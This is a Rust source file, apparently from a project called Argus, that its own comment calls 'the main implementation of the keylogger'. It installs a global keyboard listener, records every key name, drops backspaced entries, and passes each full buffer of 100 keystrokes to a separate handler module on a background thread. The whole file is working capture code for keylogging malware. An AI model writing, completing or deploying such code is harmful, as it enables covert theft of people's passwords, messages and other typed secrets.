use crate::method::Method;

use rdev::{listen, Event, EventType::KeyPress, Key::Backspace};

use std::io::{self, Write};
use std::sync::Arc;
use std::sync::RwLock;
use std::thread;

/// The main implementation of the keylogger
pub struct Argus {
    method: Arc<RwLock<Method>>,
    buffer: Arc<RwLock<Vec<String>>>,
    buffer_capacity: usize,
}

impl Argus {
    pub fn new(method: Method) -> Self {
        Self {
            method: Arc::new(RwLock::new(method)),
            buffer: Arc::new(RwLock::new(Vec::new())),
            //buffer_capacity: Arc::new(RwLock::new(1000)),
            buffer_capacity: 100
        }
    }

    pub fn set_buffer_capacity(mut self, new_cap: usize) -> Self {
        self.buffer_capacity = new_cap;
        self
    }

    pub fn start(&mut self, log: bool) {
        let buffer = self.buffer.clone();
        let method = self.method.clone();
        // creating a copy for internal variable
        // `buffer_capacity` because passing the internal
        // variable itself into such scope, will automatically
        // deallocate such internal variable. Regardless, the compiler
        // will complain if I don't.
        let buffer_cap = self.buffer_capacity;
        let _ = listen(move |event: Event| {
            let mut buffer = buffer.write().unwrap();
            // Dealing with keyboard misspresses when typing.
            // No need to store unnecessary key inputs
            if let KeyPress(Backspace) = event.event_type {
                if buffer.is_empty() {
                    return;
                }
                // removes the last element from the buffer
                buffer.pop();
            }
            if let Some(name) = event.name {
                if log {
                    let mut stdout = io::stdout();
                    write!(stdout, "\r{} / {}    ", buffer.len(), buffer_cap).unwrap();
                    let _ = stdout.flush();
                }
                if buffer.len() == buffer_cap {
                    buffer.push(name);
                    // spawns a daemon thread to avoid a delay when handling the buffer
                    let buffer_clone = buffer.clone();
                    let method_clone = method.clone();
                    let _ = thread::spawn(move || {
                        method_clone
                            .write()
                            .unwrap()
                            .handle(&buffer_clone)
                            .expect("Failed to handle buffer");
                    });
                    buffer.clear();
                    return;
                }
                buffer.push(name);
            }
        });
    }
}
